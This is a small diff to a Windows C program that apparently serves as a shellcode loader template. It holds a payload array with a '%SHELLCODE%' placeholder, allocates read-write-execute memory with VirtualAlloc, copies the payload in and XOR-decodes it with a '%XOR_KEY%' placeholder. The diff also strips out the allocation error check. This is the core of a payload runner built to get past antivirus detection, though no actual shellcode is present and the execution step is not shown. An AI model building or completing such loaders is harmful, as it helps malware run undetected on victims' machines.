@@ -1,5 +1,4 @@
 #include <windows.h>
-// #include "config.h"
 #include <stdio.h>
 
 __attribute__((section(".text"))) unsigned char msgbox_payload[] = "%SHELLCODE%";
@@ -17,17 +16,13 @@ void main() {
     size_t ss = sizeof(msgbox_payload);
 
     
-
     // Allocating executable memory
     void *exec_mem = VirtualAlloc(NULL, ss, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!exec_mem) {
-        printf("Erreur: Impossible d'allouer la mémoire (%lu)\n", GetLastError());
-        return;
-    }
 
     // Copy shellcode into allocated memory
     memcpy(exec_mem, msgbox_payload, ss);
 
+    // XORing shellcode
     for (size_t i = 0; i < ss; i++) {
         ((unsigned char*)exec_mem)[i] ^= %XOR_KEY%;
     }
